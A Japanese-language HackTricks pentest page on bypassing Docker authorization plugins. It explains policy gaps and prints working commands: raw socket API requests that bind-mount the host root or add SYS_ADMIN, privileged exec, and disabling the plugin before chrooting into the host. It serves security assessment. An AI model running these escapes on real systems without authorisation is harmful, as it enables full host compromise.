# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Runtime authorization plugins は、caller が特定の daemon action を実行できるかどうかを判断する、追加の policy layer です。典型的な例が Docker です。デフォルトでは、Docker daemon と通信できる人は、実質的に daemon を広範囲に制御できます。Authorization plugins は、認証済みユーザーと要求された API operation を調べ、policy に従って request を許可または拒否することで、このモデルを制限しようとします。

このトピックに専用ページが必要なのは、attacker がすでに Docker API、または `docker` group のユーザーへのアクセスを持っている場合に、exploitation model が変わるためです。このような環境では、問題は単に「daemon に到達できるか」ではなく、「daemon は authorization layer によって隔離されているか、隔離されている場合、その layer は未処理の endpoint、弱い JSON parsing、または plugin-management permissions を通じて bypass できるか」です。

## Operation

request が Docker daemon に到達すると、authorization subsystem は request context を、インストール済みの 1 つ以上の plugin に渡すことができます。plugin は、認証済みユーザーの identity、request の詳細、一部の header、content type が適切な場合は request または response body の一部を参照します。複数の plugin を chain でき、すべての plugin が request を許可した場合にのみ access が認められます。

このモデルは強固に見えますが、安全性は policy author が API をどれだけ完全に理解しているかに全面的に依存します。`docker run --privileged` を block していても、`docker exec` を無視したり、top-level の `Binds` などの代替 JSON key を見落としたり、plugin administration を許可したりする plugin は、制限されているという誤った安心感を生みながら、直接的な privilege-escalation path を残す可能性があります。

## Common Plugin Targets

policy review で重要な領域は次のとおりです。

- container creation endpoint
- `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode`、namespace-sharing option などの `HostConfig` field
- `docker exec` の動作
- plugin management endpoint
- 意図した policy model の範囲外で runtime action を間接的に trigger できる endpoint

歴史的には、Twistlock の `authz` plugin や、`authobot` のような単純な教育用 plugin によって、このモデルは容易に study できました。これらの policy file と code path により、endpoint-to-action mapping が実際にどのように実装されているかが示されていたためです。assessment work で重要な教訓は、policy author が最も目立つ CLI command だけでなく、API surface 全体を理解しなければならないということです。

## Abuse

最初の目標は、実際に何が block されているかを把握することです。daemon が action を拒否すると、error が plugin 名を leak することが多く、使用中の control の特定に役立ちます。
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
より広範な endpoint profiling が必要な場合は、`docker_auth_profiler` などの tools が有用です。これらは、plugin によって実際に許可されている API routes と JSON structures を確認するという、 otherwise repetitive な作業を自動化します。

環境で custom plugin が使用されており、API と対話できる場合は、実際に filter される object fields を列挙します。
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
これらのチェックが重要なのは、多くの認可の失敗が概念固有ではなく、フィールド固有だからです。plugin は、同等の API 構造を完全にブロックせずに、CLI パターンを拒否することがあります。

### 完全な例: `docker exec` によるコンテナ作成後の権限追加

privileged なコンテナの作成をブロックする一方で、unconfined なコンテナの作成と `docker exec` を許可するポリシーは、依然として bypass される可能性があります。
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
daemon が 2 つ目のステップを受け入れると、user は、policy 作成者が制限されていると考えていた container 内の privileged interactive process を取り戻せます。

### Raw API 経由の Bind Mount の完全な例

壊れた policy の中には、1 つの JSON 形式しか検査しないものがあります。root filesystem の bind mount が一貫してブロックされていない場合、host を引き続き mount できます:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同じ考え方は `HostConfig` の下にも現れる場合があります:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影響として、host のファイルシステムから完全に脱出できます。重要な点は、この bypass が kernel の bug ではなく、policy の適用範囲が不完全であることに起因している点です。

### Full Example: 未チェックの Capability Attribute

policy が capability に関連する attribute のフィルタリングを忘れると、attacker は危険な capability を再取得する container を作成できる可能性があります：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` または同様に強力な capability が存在すると、[capabilities.md](protections/capabilities.md) および [privileged-containers.md](privileged-containers.md) で説明されている多くの breakout 手法が利用可能になります。

### 完全な例: Plugin の無効化

Plugin-management 操作が許可されている場合、最も簡単な bypass は制御を完全に無効化することです:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
これはコントロールプレーンレベルでのポリシーの不備です。認可レイヤーは存在しますが、制限されるはずだったユーザーが、依然としてそれを無効化する権限を保持しています。

## チェック

これらのコマンドは、ポリシーレイヤーが存在するかどうか、また、それが完全なものか表面的なものにすぎないように見えるかどうかを確認することを目的としています。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
ここで興味深い点:

- plugin 名を含む拒否メッセージは、authorization layer の存在を確認でき、正確な実装を明らかにすることも多い。
- attacker に表示される plugin list だけで、disable または reconfigure 操作が可能かどうかを発見できる場合がある。
- 明らかな CLI action だけを block し、raw API request を block しない policy は、回避可能であることが証明されるまでは、回避可能なものとして扱うべきである。

## Runtime のデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは有効化されていない | authorization plugin が設定されていない限り、Daemon への access は実質的に全か無かとなる | 不完全な plugin policy、allowlist ではなく blacklist を使用、plugin management を許可、field-level の盲点 |
| Podman | 一般的な直接相当機能はない | Podman は通常、Docker-style authz plugin よりも Unix permissions、rootless execution、API exposure の判断に依存する | rootful Podman API を広範囲に公開、弱い socket permissions |
| containerd / CRI-O | 異なる control model | これらの Runtime は通常、Docker authz plugin ではなく、socket permissions、node の trust boundary、高位の orchestrator controls に依存する | workload に socket を mount、弱い node-local trust assumptions |
| Kubernetes | Docker authz plugin ではなく、API-server と kubelet の layer で authn/authz を使用 | Cluster RBAC と admission controls が主な policy layer となる | 過度に広範な RBAC、弱い admission policy、kubelet または runtime API を直接公開 |

{{#include ../../../banners/hacktricks-training.md}}
